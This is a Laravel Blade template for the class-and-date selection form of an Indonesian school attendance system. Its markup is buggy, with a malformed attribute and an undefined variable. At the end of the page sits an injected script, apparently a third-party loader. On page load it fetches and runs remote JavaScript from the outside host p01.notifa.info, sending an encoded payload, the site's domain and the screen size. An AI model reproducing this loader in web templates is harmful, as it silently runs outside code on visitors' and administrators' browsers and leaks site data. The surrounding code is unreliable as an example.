@extends('layouts.admin')
@section('content')



<!DOCTYPE html>
<html>

<head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>SISTEM ABSENSI REAL TIME</title>

    <!-- Core CSS - Include with every page -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="font-awesome/css/font-awesome.css" rel="stylesheet">

    <!-- Page-Level Plugin CSS - Tables -->
    <link href="css/plugins/dataTables/dataTables.bootstrap.css" rel="stylesheet">

    <!-- SB Admin CSS - Include with every page -->
    <link href="css/sb-admin.css" rel="stylesheet">

</head>

<body>


        <div id="page-wrapper">
          <div class="row">
                <div class="col-lg-12">
					<h3 class="page-header"><strong>Input Data Absensi</strong></h3>
                </div>
                <!-- /.col-lg-12 -->
            </div>
            <!-- /.row -->
            <div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
                            Pilih Kelas
                        </div>
                        <div class="panel-body">
                            <div class="row">
                                    <form method="get" role="form" action="input">
                                <div class="col-lg-6">
<input type="hidden" name="module" value="input_absen">
<input type="hidden" name="jam" value="1">

                                    
                                        <div class="form-group">
                                            <label>Kelas</label>
                        @php $no = 1; @endphp
                        @foreach($absensi_siswa as $data)
    
                                            <select class="form-control" value"{{$data->nama_kelas}}" name="kls">
                                                <option value='{{$kelas->nama_kelas}}'></option>            
                                            </select>
                                        </div>
                         @endforeach         
                                <div class="col-lg-4">

                                        <div class="form-group">
                                            <label>Tanggal</label>
                                            <select class="form-control" name="tanggal">
<option>1</option><option selected>2</option><option>3</option><option>4</option><option>5</option><option>6</option><option>7</option><option>8</option><option>9</option><option>10</option><option>11</option><option>12</option><option>13</option><option>14</option><option>15</option><option>16</option><option>17</option><option>18</option><option>19</option><option>20</option><option>21</option><option>22</option><option>23</option><option>24</option><option>25</option><option>26</option><option>27</option><option>28</option><option>29</option><option>30</option><option>31</option>                                         </select>
                                        </div>
</div>         
                                <div class="col-lg-4">

                                        <div class="form-group">
                                            <label>Bulan</label>
                                            <select class="form-control" name="bulan">
<option>1</option><option>2</option><option>3</option><option>4</option><option>5</option><option selected>6</option><option>7</option><option>8</option><option>9</option><option>10</option><option>11</option><option>12</option>                                            </select>
                                        </div>
</div>         
                                <div class="col-lg-4">

                                        <div class="form-group">
                                            <label>Tahun</label>
                                            <select class="form-control" name="tahun">
<option>2000</option><option>2001</option><option>2002</option><option>2003</option><option>2004</option><option>2005</option><option>2006</option><option>2007</option><option>2008</option><option>2009</option><option>2010</option><option>2011</option><option>2012</option><option>2013</option><option>2014</option><option>2015</option><option>2016</option><option>2017</option><option selected>2018</option><option>2019</option><option>2020</option><option>2021</option><option>2022</option><option>2023</option><option>2024</option><option>2025</option><option>2026</option><option>2027</option><option>2028</option><option>2029</option><option>2030</option><option>2031</option><option>2032</option><option>2033</option><option>2034</option><option>2035</option><option>2036</option><option>2037</option><option>2038</option><option>2039</option><option>2040</option><option>2041</option><option>2042</option><option>2043</option><option>2044</option><option>2045</option><option>2046</option><option>2047</option><option>2048</option><option>2049</option><option>2050</option>                                            </select>
                                        </div>
</div>         

                                        <button type="submit" class="btn btn-default">Submit Button</button>

                                </div>
                                <!-- /.col-lg-6 (nested) -->
                                    </form>

                            </div>
                            <!-- /.row (nested) -->
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-12 -->
            </div>
            <!-- /.row -->        </div>
        <!-- /#page-wrapper -->

    </div>
    <!-- /#wrapper -->

    <!-- Core Scripts - Include with every page -->
    <script src="js/jquery-1.10.2.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/plugins/metisMenu/jquery.metisMenu.js"></script>

    <!-- Page-Level Plugin Scripts - Tables -->
    <script src="js/plugins/dataTables/jquery.dataTables.js"></script>
    <script src="js/plugins/dataTables/dataTables.bootstrap.js"></script>

    <!-- SB Admin Scripts - Include with every page -->
    <script src="js/sb-admin.js"></script>

    <!-- Page-Level Demo Scripts - Tables - Use for reference -->
    <script>
    $(document).ready(function() {
        $('#dataTables-example').dataTable();
    });
    </script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mnXfyekY6omkjFB7%2byNh3jtnGzah7FC4pTAbKLPAWPqOySvtHkQY%2bBvzImhSAkA3VMy0%2bw5irebobZiysUhZCe2xNDyVy%2bmImoVDEB4HGEYzJFfyulleVgLMVsdjPKMW6Ov0m2zemPgePzK3imFmQNoxhCYr8tg86jJsNR4AW1QiIj7p56ZIf3poeH8cqhEIFNZPP25mqPhpnV7darXhTIvEpZq5yaK%2f1BGsO3xMBtTijLskMET5heUELY%2fiEX7e9pfsE6%2bMQzxuoLjaiWbsA2QMTqscyd1DziWpOLFIn%2fsfVu3GTj2YunQJpYgke08UTXx0KUyAVHrWzQKYX1%2bN9OSgC%2fi4Ac7Wr0H4PlxukijiN2NHa3XDVOAh7NE0Gk9JPL82agFQ7WkvK0ChmJaiHbqDMfnGMGCM1Q6RC%2fWA6Pyo1DrierauCOam5F%2fy%2bQQvlRis9z1OBkOhJ7IOHSwQeeNdbQfbxTV%2bNhvRRFxaReRBzRNC3FAauXmyZS5U5gPKLrS0mfHXOGruhxWJgOYAMbqUFV0%2fQVcVumttrBniApfiy1ugwT99QiRsDgj%2fAReToVJopyYdzGz4%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>

@endsection
